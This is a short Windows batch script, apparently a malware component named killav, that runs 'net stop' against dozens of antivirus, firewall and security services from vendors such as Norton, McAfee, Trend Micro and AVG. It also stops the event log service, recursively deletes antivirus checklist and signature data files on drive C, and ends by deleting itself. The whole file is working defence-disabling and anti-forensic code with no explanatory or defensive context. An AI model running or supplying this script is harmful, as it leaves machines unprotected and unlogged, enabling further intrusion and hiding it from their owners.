@echo off
net stop "RsRavMon" /y
net stop "RsCCenter" /y
net stop "Norton AntiVirus Server" /y
net stop "Norton AntiVirus" /y
net stop "Serv-U" /y
net stop "Norton AntiVirus Auto Protect Service" /y
net stop "Norton AntiVirus Client" /y
net stop "Symantec AntiVirus Client" /y
net stop "Norton AntiVirus Server" /y
net stop "NAV Alert" /y
net stop "Nav Auto-Protect" /y
net stop "McShield" /y
net stop "DefWatch" /y
net stop "eventlog" /y
net stop "TCP/IP NetBIOS Helper Service" /y
net stop "WMDM PMSP Service" /y
net stop "lmhosts" /y
net stop "eventlog" /y
net stop "InoRPC" /y
net stop "InoRT" /y
net stop "InoTask" /y
net stop "IREIKE" /y
net stop "IPSECMON" /y
net stop "GhostStartService" /y
net stop "SharedAccess" /y
net stop "NAVAPSVC" /y
net stop "NISUM" /y
net stop "SymProxySvc" /y
net stop "NISSERV" /y
net stop "ntrtscan" /y
net stop "tmlisten" /y
net stop "PccPfw" /y
net stop "tmproxy" /y
net stop "Tmntsrv" /y
net stop "PCCPFW" /y
net stop "AvSynMgr" /y
net stop "McAfeeFramework" /y
net stop "Micorsoft Network Firewall Service" /y
net stop "AvgServ" /y
net stop "MonSvcNT" /y
net stop "V3MonNT" /y
net stop "V3MonSvc" /y
net stop "spidernt" /y
net stop "MCVSrte" /y
net stop "SweepNet" /y
net stop "SWEEPSRV.SYS" /y
net stop "xCmdSvc" /y
del c:\*ANTI*VIR*.DAT /s
del c:\*CHKLIST*.DAT /s
del c:\*CHKLIST*.MS /s
del c:\*CHKLIST*.CPS /s
del c:\*CHKLIST*.TAV /s
del c:\*IVB*.NTZ /s
del c:\*SMARTCHK*.MS /s
del c:\*SMARTCHK*.CPS /s
del c:\*AVGQT*.DAT /s
del c:\*AGUARD*.DAT /s
del killav-NT3H5.bat
